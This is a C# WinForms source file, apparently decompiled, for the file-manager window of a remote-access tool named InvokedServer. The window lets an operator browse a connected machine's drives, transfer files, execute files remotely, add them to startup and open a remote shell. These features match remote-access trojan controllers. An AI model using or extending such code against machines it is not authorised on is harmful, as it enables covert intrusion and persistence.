

using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
using InvokedCommon.Enums;
using InvokedCommon.Helpers;
using InvokedCommon.Messages;
using InvokedCommon.Models;
using InvokedServer.Controls;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Models;
using InvokedServer.Networking;

namespace InvokedServer.Forms
{
	public partial class FrmFileManager : Form
	{
		private string _currentDir;
		private readonly Client _connectClient;
		private readonly FileManagerHandler _fileManagerHandler;
		private static readonly Dictionary<Client, FrmFileManager> OpenedForms = new Dictionary<Client, FrmFileManager>();

		public static FrmFileManager CreateNewOrGetExisting(Client client)
		{
			if (FrmFileManager.OpenedForms.ContainsKey(client))
				return FrmFileManager.OpenedForms[client];
			FrmFileManager newOrGetExisting = new FrmFileManager(client);
			newOrGetExisting.Disposed += (EventHandler)((sender, args) => FrmFileManager.OpenedForms.Remove(client));
			FrmFileManager.OpenedForms.Add(client, newOrGetExisting);
			return newOrGetExisting;
		}

		public FrmFileManager(Client client)
		{
			this._connectClient = client;
			this._fileManagerHandler = new FileManagerHandler(client);
			this.RegisterMessageHandler();
			this.InitializeComponent();
		}

		private void RegisterMessageHandler()
		{
			this._connectClient.ClientState += new Client.ClientStateEventHandler(this.ClientDisconnected);
			this._fileManagerHandler.ProgressChanged += new MessageProcessorBase<string>.ReportProgressEventHandler(this.SetStatusMessage);
			this._fileManagerHandler.DrivesChanged += new FileManagerHandler.DrivesChangedEventHandler(this.DrivesChanged);
			this._fileManagerHandler.DirectoryChanged += new FileManagerHandler.DirectoryChangedEventHandler(this.DirectoryChanged);
			this._fileManagerHandler.FileTransferUpdated += new FileManagerHandler.FileTransferUpdatedEventHandler(this.FileTransferUpdated);
			MessageHandler.Register((IMessageProcessor)this._fileManagerHandler);
		}

		private void UnregisterMessageHandler()
		{
			MessageHandler.Unregister((IMessageProcessor)this._fileManagerHandler);
			this._fileManagerHandler.ProgressChanged -= new MessageProcessorBase<string>.ReportProgressEventHandler(this.SetStatusMessage);
			this._fileManagerHandler.DrivesChanged -= new FileManagerHandler.DrivesChangedEventHandler(this.DrivesChanged);
			this._fileManagerHandler.DirectoryChanged -= new FileManagerHandler.DirectoryChangedEventHandler(this.DirectoryChanged);
			this._fileManagerHandler.FileTransferUpdated -= new FileManagerHandler.FileTransferUpdatedEventHandler(this.FileTransferUpdated);
			this._connectClient.ClientState -= new Client.ClientStateEventHandler(this.ClientDisconnected);
		}

		private void ClientDisconnected(Client client, bool connected)
		{
			if (connected)
				return;
			this.Invoke(new MethodInvoker(((Form)this).Close));
		}

		private void DrivesChanged(object sender, Drive[] drives)
		{
			this.cmbDrives.Items.Clear();
			this.cmbDrives.DisplayMember = "DisplayName";
			this.cmbDrives.ValueMember = "RootDirectory";
			this.cmbDrives.DataSource = (object)new BindingSource((object)drives, null);
			this.SetStatusMessage((object)this, "Ready");
		}

		private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
		{
			this.txtPath.Text = remotePath;
			this._currentDir = remotePath;
			this.lstDirectory.Items.Clear();
			this.AddItemToFileBrowser("..", 0L, FileType.Back, 0);
			foreach (FileSystemEntry fileSystemEntry in items)
			{
				switch (fileSystemEntry.EntryType)
				{
					case FileType.File:
						ContentType? contentType = fileSystemEntry.ContentType;
						int num;
						if (contentType.HasValue)
						{
							contentType = fileSystemEntry.ContentType;
							num = (int)contentType.Value;
						}
						else
							num = 2;
						int imageIndex = num;
						this.AddItemToFileBrowser(fileSystemEntry.Name, fileSystemEntry.Size, fileSystemEntry.EntryType, imageIndex);
						break;
					case FileType.Directory:
						this.AddItemToFileBrowser(fileSystemEntry.Name, 0L, fileSystemEntry.EntryType, 1);
						break;
				}
			}
			this.SetStatusMessage((object)this, "Ready");
		}

		private int GetTransferImageIndex(string status)
		{
			int transferImageIndex = -1;
			switch (status)
			{
				case "Completed":
					transferImageIndex = 1;
					break;
				case "Canceled":
					transferImageIndex = 0;
					break;
			}
			return transferImageIndex;
		}

		private void FileTransferUpdated(object sender, FileTransfer transfer)
		{
			for (int index = 0; index < this.lstTransfers.Items.Count; ++index)
			{
				if (this.lstTransfers.Items[index].SubItems[0].Text == transfer.Id.ToString())
				{
					this.lstTransfers.Items[index].SubItems[2].Text = transfer.Status;
					this.lstTransfers.Items[index].ImageIndex = this.GetTransferImageIndex(transfer.Status);
					return;
				}
			}
			this.lstTransfers.Items.Add(new ListViewItem(new string[4]
			{
				transfer.Id.ToString(),
				transfer.Type.ToString(),
				transfer.Status,
				transfer.RemotePath
			})
			{
				Tag = (object)transfer,
				ImageIndex = this.GetTransferImageIndex(transfer.Status)
			});
		}

		private string GetAbsolutePath(string path)
		{
			if (string.IsNullOrEmpty(this._currentDir) || this._currentDir[0] != '/')
				return Path.GetFullPath(Path.Combine(this._currentDir, path));
			return this._currentDir.Length == 1 ? Path.Combine(this._currentDir, path) : Path.Combine(this._currentDir + "/", path);
		}

		private string NavigateUp()
		{
			if (string.IsNullOrEmpty(this._currentDir) || this._currentDir[0] != '/')
				return this.GetAbsolutePath("..\\");
			if (this._currentDir.LastIndexOf('/') > 0)
			{
				this._currentDir = this._currentDir.Remove(this._currentDir.LastIndexOf('/') + 1);
				this._currentDir = this._currentDir.TrimEnd('/');
			}
			else
				this._currentDir = "/";
			return this._currentDir;
		}

		private void FrmFileManager_Load(object sender, EventArgs e)
		{
			this.Text = WindowHelper.GetWindowTitle("File Manager", this._connectClient);
			this._fileManagerHandler.RefreshDrives();
		}

		private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.UnregisterMessageHandler();
			this._fileManagerHandler.Dispose();
		}

		private void cmbDrives_SelectedIndexChanged(object sender, EventArgs e)
		{
			this.SwitchDirectory(this.cmbDrives.SelectedValue.ToString());
		}

		private void lstDirectory_DoubleClick(object sender, EventArgs e)
		{
			if (this.lstDirectory.SelectedItems.Count <= 0)
				return;
			switch (((FileManagerListTag)this.lstDirectory.SelectedItems[0].Tag).Type)
			{
				case FileType.Directory:
					this.SwitchDirectory(this.GetAbsolutePath(this.lstDirectory.SelectedItems[0].SubItems[0].Text));
					break;
				case FileType.Back:
					this.SwitchDirectory(this.NavigateUp());
					break;
			}
		}

		private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
		{
			this.lstDirectory.LvwColumnSorter.NeedNumberCompare = e.Column == 1;
		}

		private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (ListViewItem selectedItem in this.lstDirectory.SelectedItems)
			{
				if (((FileManagerListTag)selectedItem.Tag).Type == FileType.File)
					this._fileManagerHandler.BeginDownloadFile(this.GetAbsolutePath(selectedItem.SubItems[0].Text));
			}
		}

		private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Title = "Select files to upload";
				openFileDialog.Filter = "All files (*.*)|*.*";
				openFileDialog.Multiselect = true;
				if (openFileDialog.ShowDialog() != DialogResult.OK)
					return;
				foreach (string fileName in openFileDialog.FileNames)
				{
					if (File.Exists(fileName))
					{
						string absolutePath = this.GetAbsolutePath(Path.GetFileName(fileName));
						this._fileManagerHandler.BeginUploadFile(fileName, absolutePath);
					}
				}
			}
		}

		private void executeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (ListViewItem selectedItem in this.lstDirectory.SelectedItems)
			{
				if (((FileManagerListTag)selectedItem.Tag).Type == FileType.File)
					this._fileManagerHandler.StartProcess(this.GetAbsolutePath(selectedItem.SubItems[0].Text));
			}
		}

		private void renameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (ListViewItem selectedItem in this.lstDirectory.SelectedItems)
			{
				FileManagerListTag tag = (FileManagerListTag)selectedItem.Tag;
				switch (tag.Type)
				{
					case FileType.File:
					case FileType.Directory:
						string absolutePath = this.GetAbsolutePath(selectedItem.SubItems[0].Text);
						string str = selectedItem.SubItems[0].Text;
						if (InputBox.Show("New name", "Enter new name:", ref str) == DialogResult.OK)
						{
							str = this.GetAbsolutePath(str);
							this._fileManagerHandler.RenameFile(absolutePath, str, tag.Type);
							continue;
						}
						continue;
					default:
						continue;
				}
			}
		}

		private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			int count = this.lstDirectory.SelectedItems.Count;
			if (count == 0 || MessageBox.Show(string.Format("Are you sure you want to delete {0} file(s)?", (object)count), "Delete Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
				return;
			foreach (ListViewItem selectedItem in this.lstDirectory.SelectedItems)
			{
				FileManagerListTag tag = (FileManagerListTag)selectedItem.Tag;
				switch (tag.Type)
				{
					case FileType.File:
					case FileType.Directory:
						this._fileManagerHandler.DeleteFile(this.GetAbsolutePath(selectedItem.SubItems[0].Text), tag.Type);
						continue;
					default:
						continue;
				}
			}
		}

		private void addToStartupToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (ListViewItem selectedItem in this.lstDirectory.SelectedItems)
			{
				if (((FileManagerListTag)selectedItem.Tag).Type == FileType.File)
				{
					using (FrmStartupAdd frmStartupAdd = new FrmStartupAdd(this.GetAbsolutePath(selectedItem.SubItems[0].Text)))
					{
						if (frmStartupAdd.ShowDialog() == DialogResult.OK)
							this._fileManagerHandler.AddToStartup(frmStartupAdd.StartupItem);
					}
				}
			}
		}

		private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.RefreshDirectory();
		}

		private void openDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string path = this._currentDir;
			if (this.lstDirectory.SelectedItems.Count == 1)
			{
				ListViewItem selectedItem = this.lstDirectory.SelectedItems[0];
				if (((FileManagerListTag)selectedItem.Tag).Type == FileType.Directory)
					path = this.GetAbsolutePath(selectedItem.SubItems[0].Text);
			}
			FrmRemoteShell newOrGetExisting = FrmRemoteShell.CreateNewOrGetExisting(this._connectClient);
			newOrGetExisting.Show();
			newOrGetExisting.Focus();
			string pathRoot = Path.GetPathRoot(path);
			newOrGetExisting.RemoteShellHandler.SendCommand(pathRoot.Remove(pathRoot.Length - 1) + " && cd \"" + path + "\"");
		}

		private void btnOpenDLFolder_Click(object sender, EventArgs e)
		{
			if (!Directory.Exists(this._connectClient.Value.DownloadDirectory))
				Directory.CreateDirectory(this._connectClient.Value.DownloadDirectory);
			System.Diagnostics.Process.Start(this._connectClient.Value.DownloadDirectory);
		}

		private void cancelToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (ListViewItem selectedItem in this.lstTransfers.SelectedItems)
			{
				if (selectedItem.SubItems[2].Text.StartsWith("Downloading") || selectedItem.SubItems[2].Text.StartsWith("Uploading") || selectedItem.SubItems[2].Text.StartsWith("Pending"))
					this._fileManagerHandler.CancelFileTransfer(int.Parse(selectedItem.SubItems[0].Text));
			}
		}

		private void clearToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (ListViewItem listViewItem in this.lstTransfers.Items)
			{
				if (!listViewItem.SubItems[2].Text.StartsWith("Downloading") && !listViewItem.SubItems[2].Text.StartsWith("Uploading") && !listViewItem.SubItems[2].Text.StartsWith("Pending"))
					listViewItem.Remove();
			}
		}

		private void lstDirectory_DragEnter(object sender, DragEventArgs e)
		{
			if (!e.Data.GetDataPresent(DataFormats.FileDrop))
				return;
			e.Effect = DragDropEffects.Copy;
		}

		private void lstDirectory_DragDrop(object sender, DragEventArgs e)
		{
			if (!e.Data.GetDataPresent(DataFormats.FileDrop))
				return;
			foreach (string str in (string[])e.Data.GetData(DataFormats.FileDrop))
			{
				if (File.Exists(str))
				{
					string absolutePath = this.GetAbsolutePath(Path.GetFileName(str));
					this._fileManagerHandler.BeginUploadFile(str, absolutePath);
				}
			}
		}

		private void btnRefresh_Click(object sender, EventArgs e) => this.RefreshDirectory();

		private void FrmFileManager_KeyDown(object sender, KeyEventArgs e)
		{
			if (e.KeyCode != Keys.F5 || string.IsNullOrEmpty(this._currentDir) || this.TabControlFileManager.SelectedIndex != 0)
				return;
			this.RefreshDirectory();
			e.Handled = true;
		}

		private void AddItemToFileBrowser(string name, long size, FileType type, int imageIndex)
		{
			this.lstDirectory.Items.Add(new ListViewItem(new string[3]
			{
				name,
				type == FileType.File ? StringHelper.GetHumanReadableFileSize(size) : string.Empty,
				type != FileType.Back ? type.ToString() : string.Empty
			})
			{
				Tag = (object)new FileManagerListTag(type, size),
				ImageIndex = imageIndex
			});
		}

		private void SetStatusMessage(object sender, string message)
		{
			this.stripLblStatus.Text = "Status: " + message;
		}

		private void RefreshDirectory() => this.SwitchDirectory(this._currentDir);

		private void SwitchDirectory(string remotePath)
		{
			this._fileManagerHandler.GetDirectoryContents(remotePath);
			this.SetStatusMessage((object)this, "Loading directory content...");
		}

		private enum TransferColumn
		{
			Id,
			Type,
			Status,
		}
	}
}